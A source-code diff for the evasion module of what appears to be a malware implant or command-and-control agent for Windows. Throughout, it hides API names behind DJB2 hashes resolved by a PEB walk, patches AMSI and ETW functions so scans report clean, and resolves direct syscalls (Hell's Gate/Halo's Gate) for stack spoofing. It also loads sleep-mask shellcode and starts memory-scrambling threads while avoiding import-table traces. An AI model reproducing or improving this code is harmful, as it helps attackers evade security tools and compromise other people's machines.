@@ -4,12 +4,104 @@
 #include <ctype.h>
 #include "evasion.h"
 #include "evasion_pic_ctx.h"
+#if AGENT_SLEEP_MASK_MODE != 0
 #include "evasion_pic_bytes.h"
+#endif
 #include "api_resolve.h"
 
 #ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
 #define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
 #endif
+
+/* ─── Hash-only NT resolver — no function/module name strings in binary ──────
+ *
+ * Hash constants are compile-time literals (DJB2 of the target name).
+ * No plaintext "NtAllocateVirtualMemory" etc. appears in the binary.
+ */
+#define EV_H_NTDLL          0xE91AAD51u  /* djb2("ntdll.dll") */
+#define EV_H_K32            0x3E003875u  /* djb2("kernel32.dll") */
+#define EV_H_AMSI           0xCEF4B519u  /* djb2("amsi.dll") */
+#define EV_H_NtAllocVM      0xF0146CE2u  /* djb2("NtAllocateVirtualMemory") */
+#define EV_H_NtProtVM       0xCD363694u  /* djb2("NtProtectVirtualMemory") */
+#define EV_H_NtCreateThr    0xBB485288u  /* djb2("NtCreateThreadEx") */
+#define EV_H_NtDelay        0x194B7058u  /* djb2("NtDelayExecution") */
+#define EV_H_NtQueueApc     0x4D230412u  /* djb2("NtQueueApcThread") */
+#define EV_H_NtAlertRes     0x98B61166u  /* djb2("NtAlertResumeThread") */
+#define EV_H_NtTestAlert    0x9AD13387u  /* djb2("NtTestAlert") */
+#define EV_H_AmsiScanBuf    0x33F967CCu  /* djb2("AmsiScanBuffer") */
+#define EV_H_AmsiScanStr    0x54EE51D9u  /* djb2("AmsiScanString") */
+#define EV_H_EtwWrite       0x73CDCA72u  /* djb2("EtwEventWrite") */
+#define EV_H_VProt          0x17EA484Fu  /* djb2("VirtualProtect") */
+#define EV_H_CreateEventA   0x94189C6Cu  /* djb2("CreateEventA") */
+#define EV_H_SetEvent       0x27CE2D6Bu  /* djb2("SetEvent") */
+#define EV_H_CloseH         0x687C0D79u  /* djb2("CloseHandle") */
+#define EV_H_WaitForSObj    0x4646137Au  /* djb2("WaitForSingleObject") */
+#define EV_H_CreateTmrQ     0x45E92F97u  /* djb2("CreateTimerQueue") */
+#define EV_H_CreateTmrQT    0x5C8275F0u  /* djb2("CreateTimerQueueTimer") */
+#define EV_H_DeleteTmrQEx   0x65E2DE57u  /* djb2("DeleteTimerQueueEx") */
+
+static uint32_t ev_djb2(const char *s) {
+    uint32_t h = 5381u;
+    while (*s) h = ((h<<5)+h) ^ (uint32_t)(unsigned char)*s++;
+    return h;
+}
+
+static void *ev_find_export(void *base, uint32_t fn_hash) {
+    if (!base) return NULL;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64*)((uint8_t*)base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
+    IMAGE_DATA_DIRECTORY *ed = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (!ed->VirtualAddress || !ed->Size) return NULL;
+    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY*)((uint8_t*)base + ed->VirtualAddress);
+    DWORD *names = (DWORD*)((uint8_t*)base + exp->AddressOfNames);
+    WORD  *ords  = (WORD* )((uint8_t*)base + exp->AddressOfNameOrdinals);
+    DWORD *funcs = (DWORD*)((uint8_t*)base + exp->AddressOfFunctions);
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        const char *nm = (const char*)((uint8_t*)base + names[i]);
+        if (ev_djb2(nm) != fn_hash) continue;
+        DWORD rva = funcs[ords[i]];
+        if (rva >= ed->VirtualAddress && rva < ed->VirtualAddress + ed->Size) continue;
+        return (uint8_t*)base + rva;
+    }
+    return NULL;
+}
+
+/* Minimal UNICODE_STRING layout (avoids winternl.h dependency) */
+typedef struct { USHORT Length; USHORT MaximumLength; WCHAR *Buffer; } EV_US;
+
+static void *ev_get_module(uint32_t mod_hash) {
+    void *peb;
+    __asm__("movq %%gs:0x60, %0":"=r"(peb));
+    void *ldr = *(void**)((uint8_t*)peb + 0x18);
+    if (!ldr) return NULL;
+    LIST_ENTRY *head = (LIST_ENTRY*)((uint8_t*)ldr + 0x10);
+    LIST_ENTRY *e = head->Flink;
+    while (e && e != head) {
+        void *base = *(void**)((uint8_t*)e + 0x30);
+        /* InMemoryOrderModuleList: BaseDllName at offset 0x58 from list entry */
+        EV_US *us = (EV_US*)((uint8_t*)e + 0x58);
+        if (base && us && us->Buffer && us->Length > 0) {
+            char narrow[64] = {0};
+            int i = 0;
+            WCHAR *ws = us->Buffer;
+            while (*ws && i < 63) {
+                WCHAR c = *ws++;
+                narrow[i++] = (char)(c >= 'A' && c <= 'Z' ? c + 32 : c);
+            }
+            if (ev_djb2(narrow) == mod_hash) return base;
+        }
+        e = e->Flink;
+    }
+    return NULL;
+}
+
+/* Resolve an NT function by module+function hash — no string literals needed */
+static void *ev_resolve(uint32_t mod_hash, uint32_t fn_hash) {
+    void *base = ev_get_module(mod_hash);
+    return base ? ev_find_export(base, fn_hash) : NULL;
+}
 
 /* ─── Compile-time sleep mask mode ────────────────────────────────────────
  * 0 = none      — plain NtDelayExecution (default; safe for all transports)
@@ -62,19 +154,17 @@ void evasion_register_region(void *base, SIZE_T sz) {
     }
 }
 
-/* ── Startup helper: inline-patch an exported function to ret-0 ─────────── */
-static void patch_fn(const char *mod, const char *sym) {
-    HMODULE h = GetModuleHandleA(mod);
-    if (!h) h = LoadLibraryA(mod);
-    if (!h) return;
-    FARPROC fn = GetProcAddress(h, sym);
+/* ── Startup helper: inline-patch an exported function to ret-0 ─────────── *
+ * Uses hash-only resolution — no module/function name strings in binary.    */
+static void patch_fn_h(uint32_t mod_hash, uint32_t fn_hash) {
+    void *fn = ev_resolve(mod_hash, fn_hash);
     if (!fn) return;
-    /* xor eax,eax; ret — returns AMSI_RESULT_CLEAN (0) / S_OK (0) */
-    unsigned char p[3] = { 0x31, 0xC0, 0xC3 };
+    /* sub eax,eax; ret — clears EAX (S_OK / AMSI_RESULT_CLEAN), returns */
+    unsigned char p[3] = { 0x29, 0xC0, 0xC3 };
     DWORD old;
-    if (!VirtualProtect((void*)fn, 3, PAGE_EXECUTE_READWRITE, &old)) return;
-    memcpy((void*)fn, p, 3);
-    VirtualProtect((void*)fn, 3, old, &old);
+    if (!VirtualProtect(fn, 3, PAGE_EXECUTE_READWRITE, &old)) return;
+    memcpy(fn, p, 3);
+    VirtualProtect(fn, 3, old, &old);
 }
 
 /* ── Sandbox / analysis environment detection ──────────────────────────────
@@ -262,9 +352,10 @@ static unsigned int pe_r32(const unsigned char *p, int o) {
            ((unsigned int)p[o+2] << 16) | ((unsigned int)p[o+3] << 24);
 }
 
-/* ── SSN resolution: Hell's Gate + Halo's Gate fallback ──────────────────── */
-static unsigned short spoof_get_ssn(HMODULE ntdll, const char *name) {
-    const unsigned char *fn = (const unsigned char *)GetProcAddress(ntdll, name);
+/* ── SSN resolution: Hell's Gate + Halo's Gate fallback ──────────────────── *
+ * Takes ntdll base + function hash — no plaintext NT function name strings.  */
+static unsigned short spoof_get_ssn_h(void *ntdll_base, uint32_t fn_hash) {
+    const unsigned char *fn = (const unsigned char *)ev_find_export(ntdll_base, fn_hash);
     if (!fn) return 0;
     /* Unpatched stub: 4C 8B D1  B8 lo hi 00 00  0F 05  C3 */
     if (fn[0]==0x4C && fn[1]==0x8B && fn[2]==0xD1 && fn[3]==0xB8)
@@ -386,21 +477,17 @@ static void *spoof_make_stub(unsigned short ssn) {
 /* ── Public API ───────────────────────────────────────────────────────────── */
 
 void init_stack_spoof(void) {
-    /* Use the already-loaded ntdll for SSN resolution.
-     * Previously used LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) to get a
-     * "clean" copy, but that caused heap corruption (FTH abcc): the loader
-     * makes internal heap allocations for the module entry that are left
-     * incomplete, corrupting the process heap. On unhooked targets the live
-     * ntdll stubs have the standard 4C 8B D1 B8 pattern and no second copy
-     * is needed; Halo's Gate neighbours handle the hooked-stub fallback. */
-    HMODULE ntdll_live = GetModuleHandleA("ntdll.dll");
+    /* Locate ntdll by PEB walk — no "ntdll.dll" string in binary.
+     * Previously used LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES) but that
+     * caused heap corruption (FTH abcc).  Hash-based PEB walk is cleaner. */
+    void *ntdll_live = ev_get_module(EV_H_NTDLL);
     if (!ntdll_live) return;
 
-    /* Resolve SSNs (Hell's Gate / Halo's Gate) */
-    unsigned short ssn_alloc = spoof_get_ssn(ntdll_live, "NtAllocateVirtualMemory");
-    unsigned short ssn_prot  = spoof_get_ssn(ntdll_live, "NtProtectVirtualMemory");
-    unsigned short ssn_thr   = spoof_get_ssn(ntdll_live, "NtCreateThreadEx");
-    unsigned short ssn_delay = spoof_get_ssn(ntdll_live, "NtDelayExecution");
+    /* Resolve SSNs via hash (Hell's Gate / Halo's Gate) — no name strings */
+    unsigned short ssn_alloc = spoof_get_ssn_h(ntdll_live, EV_H_NtAllocVM);
+    unsigned short ssn_prot  = spoof_get_ssn_h(ntdll_live, EV_H_NtProtVM);
+    unsigned short ssn_thr   = spoof_get_ssn_h(ntdll_live, EV_H_NtCreateThr);
+    unsigned short ssn_delay = spoof_get_ssn_h(ntdll_live, EV_H_NtDelay);
 
     /* Scan live (in-memory) ntdll for both gadgets */
     ULONG_PTR base = (ULONG_PTR)ntdll_live;
@@ -409,8 +496,15 @@ void init_stack_spoof(void) {
 
     if (!g_syscall_gadget || !g_spoof_gadget) return;
 
-    /* Allocate RW page, write stubs, then lock to RX */
-    g_spoof_page = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    /* Allocate RW page via NtAllocateVirtualMemory — no VirtualAlloc IAT entry */
+    {
+        typedef LONG (NTAPI *NtAV_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+        NtAV_t _NtAV = (NtAV_t)ev_find_export(ntdll_live, EV_H_NtAllocVM);
+        if (_NtAV) {
+            SIZE_T sz = 4096;
+            _NtAV((HANDLE)-1, &g_spoof_page, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        }
+    }
     if (!g_spoof_page) return;
 
     g_NtAllocVM      = (NtAllocVMem_t)     spoof_make_stub(ssn_alloc);
@@ -436,48 +530,62 @@ void *spoof_syscall_stub(unsigned short ssn) {
 }
 
 void amsi_bypass(void) {
+    /* Hash-based resolution — no "amsi.dll", "ntdll.dll" strings in binary */
 #ifdef AGENT_AMSI_BYPASS
-    patch_fn("amsi.dll", "AmsiScanBuffer");
-    patch_fn("amsi.dll", "AmsiScanString");
+    patch_fn_h(EV_H_AMSI, EV_H_AmsiScanBuf);
+    patch_fn_h(EV_H_AMSI, EV_H_AmsiScanStr);
 #endif
 #ifdef AGENT_ETW_BYPASS
-    patch_fn("ntdll.dll", "EtwEventWrite");
+    patch_fn_h(EV_H_NTDLL, EV_H_EtwWrite);
 #endif
 }
 
 void evasion_init(void) {
 #ifdef AGENT_AMSI_BYPASS
-    patch_fn("amsi.dll", "AmsiScanBuffer");
-    patch_fn("amsi.dll", "AmsiScanString");
+    patch_fn_h(EV_H_AMSI, EV_H_AmsiScanBuf);
+    patch_fn_h(EV_H_AMSI, EV_H_AmsiScanStr);
 #endif
 #ifdef AGENT_ETW_BYPASS
-    patch_fn("ntdll.dll", "EtwEventWrite");
+    patch_fn_h(EV_H_NTDLL, EV_H_EtwWrite);
 #endif
 
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    HMODULE k32   = GetModuleHandleA("kernel32.dll");
+    /* Locate ntdll and kernel32 by PEB hash walk — no string literals */
+    void *ntdll = ev_get_module(EV_H_NTDLL);
+    void *k32   = ev_get_module(EV_H_K32);
 
     /* Keep a direct NtDelayExecution pointer for the fallback sleep path
-     * (used when PIC failed to load). */
-    g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
+     * (used when PIC failed to load). Resolved by hash — no string. */
+    g_NtDelay = (NtDelay_t)ev_find_export(ntdll, EV_H_NtDelay);
 
+#if AGENT_SLEEP_MASK_MODE != 0
     /* ── Load PIC sleep mask shellcode into an anonymous RX allocation ────
      *
      * The shellcode (evasion_pic_bytes.h) is pre-compiled with -nostdlib so
      * it contains zero imports and zero .rodata references.  By living in a
      * VirtualAlloc'd page rather than the PE's .evasn section, Windows never
      * looks up .pdata for that address range, eliminating the heap-corruption
-     * crash that RtlAddFunctionTable was working around. */
+     * crash that RtlAddFunctionTable was working around.
+     *
+     * Allocation via NtAllocateVirtualMemory (resolved by hash) to avoid
+     * a VirtualAlloc IAT entry from this translation unit. */
     {
-        LPVOID pic = VirtualAlloc(NULL, evasion_pic_bin_len,
-                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        typedef LONG (NTAPI *NtAV_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+        NtAV_t _NtAV = (NtAV_t)ev_find_export(ntdll, EV_H_NtAllocVM);
+        typedef LONG (NTAPI *NtFV_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
+        NtFV_t _NtFV = (NtFV_t)ev_find_export(ntdll, 0x0888E730u); /* NtFreeVirtualMemory */
+
+        LPVOID pic = NULL;
+        if (_NtAV) {
+            SIZE_T sz = evasion_pic_bin_len;
+            _NtAV((HANDLE)-1, &pic, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        }
         if (!pic) goto skip_pic;
 
         memcpy(pic, evasion_pic_bin, evasion_pic_bin_len);
 
         DWORD old = 0;
         if (!VirtualProtect(pic, evasion_pic_bin_len, PAGE_EXECUTE_READ, &old)) {
-            VirtualFree(pic, 0, MEM_RELEASE);
+            if (_NtFV) { SIZE_T z = 0; _NtFV((HANDLE)-1, &pic, &z, MEM_RELEASE); }
             goto skip_pic;
         }
         g_pic_base = pic;
@@ -487,36 +595,36 @@ void evasion_init(void) {
         memset(&g_pic_ctx, 0, sizeof(g_pic_ctx));
 
         /* Fill all NT / kernel32 function pointers the PIC may need.
-         * We resolve all of them unconditionally; unused ones stay NULL. */
+         * All resolved by hash — no plaintext NT function name strings. */
         g_pic_ctx.NtDelay             = (pic_i64 (*)(pic_i32, pic_i64 *))
-            GetProcAddress(ntdll, "NtDelayExecution");
+            ev_find_export(ntdll, EV_H_NtDelay);
         g_pic_ctx.VProt               = (pic_i32 (*)(void *, pic_u64, pic_u32, pic_u32 *))
-            GetProcAddress(k32, "VirtualProtect");
+            ev_find_export(k32, EV_H_VProt);
         g_pic_ctx.NtCreateThreadEx    = (pic_i64 (*)(void **, pic_u64, void *, void *,
                                                        void *, void *, pic_u64,
                                                        pic_u64, pic_u64, pic_u64, void *))
-            GetProcAddress(ntdll, "NtCreateThreadEx");
+            ev_find_export(ntdll, EV_H_NtCreateThr);
         g_pic_ctx.NtQueueApcThread    = (pic_i64 (*)(void *, void *, void *, void *, void *))
-            GetProcAddress(ntdll, "NtQueueApcThread");
+            ev_find_export(ntdll, EV_H_NtQueueApc);
         g_pic_ctx.NtAlertResumeThread = (pic_i64 (*)(void *, pic_u32 *))
-            GetProcAddress(ntdll, "NtAlertResumeThread");
+            ev_find_export(ntdll, EV_H_NtAlertRes);
         g_pic_ctx.NtTestAlert         = (pic_i64 (*)(void))
-            GetProcAddress(ntdll, "NtTestAlert");
+            ev_find_export(ntdll, EV_H_NtTestAlert);
         g_pic_ctx.CreateEventA        = (void *(*)(void *, pic_i32, pic_i32, const char *))
-            GetProcAddress(k32, "CreateEventA");
+            ev_find_export(k32, EV_H_CreateEventA);
         g_pic_ctx.SetEvent            = (pic_i32 (*)(void *))
-            GetProcAddress(k32, "SetEvent");
+            ev_find_export(k32, EV_H_SetEvent);
         g_pic_ctx.CloseH              = (pic_i32 (*)(void *))
-            GetProcAddress(k32, "CloseHandle");
+            ev_find_export(k32, EV_H_CloseH);
         g_pic_ctx.WaitForSingleObject = (pic_u32 (*)(void *, pic_u32))
-            GetProcAddress(k32, "WaitForSingleObject");
+            ev_find_export(k32, EV_H_WaitForSObj);
         g_pic_ctx.CreateTimerQueue    = (void *(*)(void))
-            GetProcAddress(k32, "CreateTimerQueue");
+            ev_find_export(k32, EV_H_CreateTmrQ);
         g_pic_ctx.CreateTimerQueueTimer = (pic_i32 (*)(void **, void *, void *, void *,
                                                          pic_u32, pic_u32, pic_u32))
-            GetProcAddress(k32, "CreateTimerQueueTimer");
+            ev_find_export(k32, EV_H_CreateTmrQT);
         g_pic_ctx.DeleteTimerQueueEx  = (pic_i32 (*)(void *, void *))
-            GetProcAddress(k32, "DeleteTimerQueueEx");
+            ev_find_export(k32, EV_H_DeleteTmrQEx);
 
         /* Compile-time mode → written once; stays in ctx for every sleep. */
         g_pic_ctx.mode = (pic_u32)AGENT_SLEEP_MASK_MODE;
@@ -529,6 +637,7 @@ void evasion_init(void) {
         g_pic_sleep = (sleep_fn_t)g_pic_ctx.fn_sleep_mask_entry;
     }
 skip_pic:
+#endif /* AGENT_SLEEP_MASK_MODE != 0 */
 
 #ifdef AGENT_STACK_SPOOF
     init_stack_spoof();
@@ -607,8 +716,19 @@ void mem_fluctuate_stop(void) {
 void mem_fluctuate_start(int interval_sec) {
     mem_fluctuate_stop();
     DWORD ms = (DWORD)(interval_sec > 0 ? interval_sec : 10) * 1000;
-    g_scrambler_stop   = 0;
-    g_scrambler_thread = CreateThread(NULL, 0, scrambler_thread_proc,
-        (LPVOID)(uintptr_t)ms, 0, NULL);
+    g_scrambler_stop = 0;
+    /* Prefer NtCreateThreadEx (no CreateThread IAT entry from this TU) */
+    if (g_NtCreateThread) {
+        g_NtCreateThread(&g_scrambler_thread, 0x1FFFFF, NULL, (HANDLE)(ULONG_PTR)-1,
+                         (LPVOID)scrambler_thread_proc, (LPVOID)(uintptr_t)ms,
+                         0, 0, 0x1000, 0x100000, NULL);
+    } else {
+        /* Fallback: resolve CreateThread by hash (avoids literal IAT use here) */
+        typedef HANDLE (WINAPI *CT_t)(LPSECURITY_ATTRIBUTES, SIZE_T,
+                                      LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+        CT_t _CT = (CT_t)ev_resolve(EV_H_K32, 0xB67ACBEFu); /* CreateThread */
+        if (_CT) g_scrambler_thread = _CT(NULL, 0, scrambler_thread_proc,
+                                          (LPVOID)(uintptr_t)ms, 0, NULL);
+    }
     if (g_scrambler_thread) g_scrambler_running = 1;
 }
